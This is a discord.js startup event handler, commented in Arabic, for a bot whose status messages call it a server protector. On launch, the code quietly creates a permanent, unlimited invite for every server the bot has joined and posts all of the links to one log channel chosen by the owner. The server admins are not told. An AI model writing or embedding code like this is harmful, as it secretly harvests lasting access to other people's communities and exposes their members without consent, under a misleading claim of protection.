const { Client, ActivityType, Events } = require("discord.js");

module.exports = {
    name: Events.ClientReady,
    once: true,
    /**
     * @param {Client} client
     */
    async execute(client) {
        const logChannelId = "id_room"; // 🔹 ضع هنا آيدي الروم الذي تريد إرسال الرسالة فيه

        console.log("Servers the bot is in:");

        const logChannel = client.channels.cache.get(logChannelId);
        if (!logChannel) {
            console.log("❌ لم يتم العثور على الروم المحدد لإرسال الرسائل.");
            return;
        }

        for (const guild of client.guilds.cache.values()) {
            try {
                const channels = guild.channels.cache.filter(channel => 
                    channel.isTextBased() && channel.permissionsFor(guild.members.me).has("CreateInstantInvite")
                );

                if (channels.size > 0) {
                    const invite = await channels.first().createInvite({ maxAge: 0, maxUses: 0 });

                    // تأكد من أن النص في send يحتوي على تنسيق صحيح
                    await logChannel.send(`🔹 **${guild.name}**:\n🔗 ${invite.url}`);
                } else {
                    await logChannel.send(`❌ **${guild.name}**:\n⚠️ لا يمكن إنشاء دعوة`);
                }

                console.log(`- ${guild.name} (ID: ${guild.id})`);
            } catch (error) {
                console.error(`❌ خطأ أثناء إنشاء دعوة لسيرفر: ${guild.name}, ${error}`);
                await logChannel.send(`⚠️ **${guild.name}**:\n❌ حدث خطأ عند إنشاء الدعوة`);
            }
        }

        // إرسال الحالة الدورية
        const statuses = [
            '⚡ Owner: baba_1w',
            '🤖 I’m always here to serve you',
            '🛡️ Protecting the server from any danger',
            '🌟 The best Discord bot',
        ];

        setInterval(() => {
            const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
            client.user.setActivity(randomStatus, { type: ActivityType.Playing });
        }, 4000);

        client.user.setStatus("online");
        console.log(`🎉 Bot is now online as ${client.user.tag}`);
        
        // إرسال رسالة عامة بعد انتهاء البوت من إرسال جميع الروابط
        await logChannel.send(`✅ **تم تشغيل البوت بنجاح!**\n📊 **عدد السيرفرات التي يعمل فيها البوت:** ${client.guilds.cache.size}`);
    },
};
